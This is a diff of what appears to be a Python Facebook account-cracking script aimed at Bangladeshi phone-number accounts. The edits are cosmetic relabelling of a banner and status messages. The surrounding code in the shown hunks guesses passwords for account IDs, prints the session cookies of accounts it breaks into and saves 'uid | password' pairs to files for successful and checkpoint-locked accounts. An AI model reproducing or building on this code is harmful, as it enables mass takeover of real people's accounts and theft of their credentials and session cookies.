@@ -137,7 +137,7 @@ def xxr():
     os.geteuid
     os.system("clear")
     print(logo)
-    jalan('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mBD CODE : \033[1;97m016 \033[1;92m, \033[1;97m017 \033[1;92m, \033[1;97m018 \033[1;92m, \033[1;97m019')
+    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
     print(" ══════════════════════════════════════════")
     rk1 = '0191'
     rk2 = '0192'
@@ -217,7 +217,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[NAYAN💥] ' +uid+ ' | ' +ps+    '  \n[‎‎💣]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[NAYANOK💥] ' +uid+ ' | ' +ps+    '  \n[‎‎💣]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/NAYAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
@@ -225,7 +225,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;30m[ME-NAHID-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                #print('\r\r\33[1;30m[nayan-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/NAYAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
